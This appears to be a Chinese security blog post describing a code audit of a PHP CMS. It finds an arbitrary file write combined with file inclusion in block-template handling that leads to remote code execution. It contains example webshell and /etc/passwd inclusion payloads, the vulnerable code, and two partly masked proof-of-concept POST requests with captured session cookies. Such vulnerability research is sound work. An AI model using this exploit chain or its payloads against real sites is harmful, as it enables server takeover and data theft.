@@ -1,0 +1,115 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="c25c5803af73bb2c096d698e7954848d">介绍</h1>
+<p>某CMS系统，采用PHP5+MYSQL做为技术基础进行开发。采用OOP（面向对象）方式进行基础运行框架搭建。模块化开发方式做为功能开发形式。框架易于功能扩展，代码维护，优秀的二次开发能力，可满足所有网站的应用需求。</p>
+<h1 data-content="1" id="038bfe8cff5f22305456f7fc004d491f">引言</h1>
+<p>某次挖掘src的时候碰到了该系统，网上关于这个系统的漏洞信息不是很多，由于是开源的CMS系统，就去官网下载了一套最新版尝试审计，关键部分可能会进行模糊处理，主要是分享一下自己代码审计的过程，希望各位大佬理解，勿喷/(ㄒoㄒ)/~~，文章同时会涉及一些比较基础的漏洞原理和方法，方便各大读者理解</p>
+<h1 data-content="1" id="174295b3a7b74d16cf38a1d3e671458c">任意文件写入漏洞</h1>
+<p>先来了解一下任意文件写入漏洞的概念</p>
+<h2 data-content="1" id="2c7b2dd7c616f2c2b543db210def8db3">定义：</h2>
+<p>任意文件写入漏洞是指攻击者能够在目标服务器上任意位置创建或修改文件的漏洞。通常发生在应用程序对文件路径或文件内容的输入缺乏适当的验证或过滤时。这个漏洞可能导致严重的后果，尤其是当攻击者能够向服务器写入包含恶意代码的文件时。</p>
+<h2 data-content="1" id="f8788273cf71b51e2d561f08f07d7084">风险：</h2>
+<p>远程代码执行：如果攻击者可以将恶意代码（如 PHP 代码）写入服务器上的文件，然后通过某种方式触发该文件的执行（例如通过文件包含漏洞），攻击者便可以控制服务器。<br/>
+破坏系统完整性：攻击者可以覆盖系统的关键文件，导致系统崩溃或篡改数据。<br/>
+植入后门：通过写入恶意程序，攻击者可以持续性地访问受害服务器。</p>
+<h2 data-content="1" id="99ad96c343fe0fa65bde697f14526aa0">例子：</h2>
+<p>如果有如下代码：</p>
+<pre><code>file_put_contents('/var/www/html/uploads/malicious.php', $user_input);</code></pre>
+<p>攻击者通过 <code>$user_input</code> 传递恶意代码 <code>&lt;?php system('whoami'); ?&gt;</code>，将会在服务器上创建一个 <code>malicious.php</code> 文件，里面包含可以执行系统命令的代码。之后，攻击者只需访问该文件，服务器便会执行文件中的恶意代码。</p>
+<h1 data-content="1" id="e01f308b5de686b39fbac9975e73a1a2">文件包含漏洞</h1>
+<h2 data-content="1" id="c4555d274fd11a84af8b4bc3a7ca13c2">定义：</h2>
+<p>文件包含漏洞发生在应用程序允许用户通过输入控制包含的文件路径，从而让服务器执行用户指定的文件。该漏洞通常出现在使用 include、require、include_once 或 require_once 等 PHP 函数的地方。</p>
+<h2 data-content="1" id="01346612e8f973201cf1e5c3cba2ab22">文件包含漏洞分为两种类型：</h2>
+<p>本地文件包含 (Local File Inclusion, LFI)：攻击者可以包含服务器上存在的本地文件。<br/>
+远程文件包含 (Remote File Inclusion, RFI)：攻击者可以包含远程服务器上的文件（取决于服务器的配置是否允许）。</p>
+<h2 data-content="1" id="e37cd1652f5bae089c244e29fa39fd07">风险：</h2>
+<p>任意代码执行：通过文件包含漏洞，攻击者可以执行服务器上已有的文件中的代码，或者结合任意文件写入漏洞，执行自己上传的恶意文件。<br/>
+信息泄露：通过包含服务器上的敏感文件（如 /etc/passwd、配置文件等），攻击者可以获取系统的重要信息。</p>
+<h2 data-content="1" id="f2d0a54970bad2b3a3f908de82e2e510">例子：</h2>
+<p>假设有如下代码：</p>
+<pre><code>include $_GET['file'];</code></pre>
+<p>攻击者通过 <code>http://example.com/page.php?file=/etc/passwd</code>，可以让服务器读取并显示 <code>Linux</code> 系统中的用户列表（<code>/etc/passwd</code> 文件）。<br/>
+如果结合任意文件写入漏洞，攻击者可以上传一个恶意文件，然后通过文件包含漏洞让服务器执行这个恶意文件，从而实现远程代码执行。</p>
+<h1 data-content="1" id="38620f580518da5f2651f31d85ba7193">常见的危险函数</h1>
+<p><code>include()</code><br/>
+<code>require()</code><br/>
+<code>include_once() / require_once()</code> 只被包含一次<br/>
+<code>readfile()</code><br/>
+<code>parse_ini_file()</code></p>
+<h1 data-content="1" id="5015d0fbfc373349d5c8db91a4d05f3c">代码分析</h1>
+<p>这里我们定位到某php文件，<code>$str</code>是可控的，而且能控制 <code>$template</code> 或 <code>$id</code>，可以通过<code>file_put_contents()</code>写入恶意代码到服务器上的 PHP 文件中。写入的文件通过<code>include $filepath</code>被直接执行，如果文件内容包含恶意 PHP 代码，就可以实现RCE。</p>
+<pre><code>$tpl = pc_base::load_sys_class('template_cache');
+$str = $tpl-&gt;template_parse(new_stripslashes($template));
+$filepath = CACHE_PATH.'caches_template'.DIRECTORY_SEPARATOR.'block'.DIRECTORY_SEPARATOR.'tmp_'.$id.'.php';
+$dir = dirname($filepath);
+if(!is_dir($dir)) {
+    @mkdir($dir, 0777, true);
+}
+if (@file_put_contents($filepath, $str)) {
+    ob_start();
+    include $filepath;
+    $html = ob_get_contents();
+    ob_clean();
+    @unlink($filepath);
+}</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241012104440-ee0236f8-8843-1.png"/><br/>
+接下来我们跟进这个<code>$str</code>中的<code>$template</code>怎么实现，往上看<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241012104806-686e8946-8844-1.png"/><br/>
+可以知道<code>$template</code>通过<code>$_POST['template']</code>得到<br/>
+这里注意一点:需要让<code>$data['type'] ==2</code>才能进入存在漏洞的代码分支，<code>$data</code>由<code>$_GET['id']</code>查询到的。</p>
+<p>那么我们漏洞利用的思路如下：</p>
+<pre><code>$data = $_GET['id']  &amp;&amp; $data['type']==2
+   $tempate  =$_POST[‘template’];
+   触发我们的漏洞</code></pre>
+<p>现在还差一步，就是如何让它进入我们<code>data['type'] == 2</code>的代码块分支呢<br/>
+1、如果数据库存在<code>type == 2</code>，那么可以直接利用<br/>
+2、如果没有<code>type == 2</code>，那我们可以通过add函数去增加一个模块<br/>
+这里我们定位到相关函数<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241012105704-a96bacf2-8845-1.png"/></p>
+<h1 data-content="1" id="259c4ccbeac44b112653e4f406945a29">漏洞实现</h1>
+<p>去用户处抓包<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241012105906-f1c96fe8-8845-1.png"/><br/>
+构造poc数据包</p>
+<pre><code>POST /index.php?m=block&amp;c=block_admin&amp;a=add&amp;pos=1 HTTP/1.1
+Host: phpcms:8093
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 51
+Origin: xxxxx
+Connection: close
+Referer: index.php?m=member&amp;c=member_model&amp;a=manage&amp;menuid=xxx&amp;pc_hash=xxxx
+Cookie: FWgAZ_admin_username=xxxxxx; FWgAZ_siteid=xxxxxx; FWgAZ_userid=xxxxxx; FWgAZ_admin_email=4208MzZZO8UZrGpRQA04HMiqd12wBG3TkGlX2wvnft0vRsBiMGTphiU; FWgAZ_sys_lang=6a62KVzSlqRK5SP9nprJNrOJRW_e6BvdbA8Z-zAea4sz8g; PNLpv_admin_username=31889bli0aWoQ4251eqBQbqYO1Kx6hP3PynMidkRCbRAsA; PNLpv_siteid=00c02x98xZMnq_rJLhWuNwFeovrxUvwjeCFAwPqo; PNLpv_userid=4edcYlDl8Z6VnzSErzIXMaFeZh8_-VTDbC_hV4Zc; PNLpv_admin_email=83a4_DImTsxNklYg_5oCwpZPeCghW2YJ3wB1c_INfVFNkXb3uvem; PNLpv_sys_lang=58d0qkyHmCXwObI_v8h9roWp4G4OpvfNTVFPPeMWK3qS2A; PHPSESSID=e06kab0pgurhj91umfvaef84hb
+Upgrade-Insecure-Requests: 1
+Priority: u=4
+
+name=xxx2&amp;dosubmit=xxx&amp;type=xxx&amp;priv=xxxx&amp;pc_hash=xxxx</code></pre>
+<p>抓包排序处修改我们的poc数据包然后放行，这时<code>id</code>已经被创建了</p>
+<pre><code>POST /index.php?m=block&amp;c=block_admin&amp;a=add&amp;pos=1 HTTP/1.1
+Host: xxxxx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+Origin: http://phpcms:8093
+Connection: close
+Referer: http://phpcms:8093/index.php?m=member&amp;c=member_model&amp;a=manage&amp;menuid=813&amp;pc_hash=ax6aeW
+Cookie: FWgAZ_admin_username=de70NVKjF7vYb7We12NdCR5CrO-0oP9B44rY2qI0Sbxb8A; FWgAZ_siteid=e6b9FAIbe9tOBsn3d6mxIDHQxCNBlOHbgInib0yA; FWgAZ_userid=7853fTTOoZxWRx6enIcnCVgLg1DWRfUSHQGdOWO1; FWgAZ_admin_email=4208MzZZO8UZrGpRQA04HMiqd12wBG3TkGlX2wvnft0vRsBiMGTphiU; FWgAZ_sys_lang=6a62KVzSlqRK5SP9nprJNrOJRW_e6BvdbA8Z-zAea4sz8g; PNLpv_admin_username=31889bli0aWoQ4251eqBQbqYO1Kx6hP3PynMidkRCbRAsA; PNLpv_siteid=00c02x98xZMnq_rJLhWuNwFeovrxUvwjeCFAwPqo; PNLpv_userid=4edcYlDl8Z6VnzSErzIXMaFeZh8_-VTDbC_hV4Zc; PNLpv_admin_email=83a4_DImTsxNklYg_5oCwpZPeCghW2YJ3wB1c_INfVFNkXb3uvem; PNLpv_sys_lang=58d0qkyHmCXwObI_v8h9roWp4G4OpvfNTVFPPeMWK3qS2A; PHPSESSID=e06kab0pgurhj91umfvaef84hb
+Upgrade-Insecure-Requests: 1
+Priority: u=4
+
+name=xxxxxx&amp;dosubmit=xxx&amp;type=2&amp;priv=xxx&amp;pc_hash=xxxx</code></pre>
+<p>可以去数据库里面看一眼，做一个验证，这里看到已经创建成功了<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241012110501-c5592bd2-8846-1.png"/><br/>
+然后我们再通过创建的id命令执行上传木马即可，返回包如图说明上传成功<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241012110639-fff39660-8846-1.png"/><br/>
+至此成功拿到shell<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20241012110708-1122a322-8847-1.png"/></p>
+<h1 data-content="1" id="2c11c1d1b72a15b658ab1a99be26b457">总结</h1>
+<p>总的来说这次审计过程比较有意思，首先发现任意文件写入和文件包含漏洞，需要进入<code>type=2</code>分支,其实当时看到这里就打算放弃这个点了，但是不死心，后来通过观察，只需要通过<code>add</code>函数添加<code>type=2</code>去实现我们下一步上传等执行命令，整个过程很坎坷，审计也很考验耐心，目前我还需要不断努力，不断学习，效率还是不够高，同时欢迎各位大佬能够一起交流审计的小技巧，让小弟也多积累一些审计的经验，谢谢各位观看，向各位学习！</p>
+</div>
+</div>
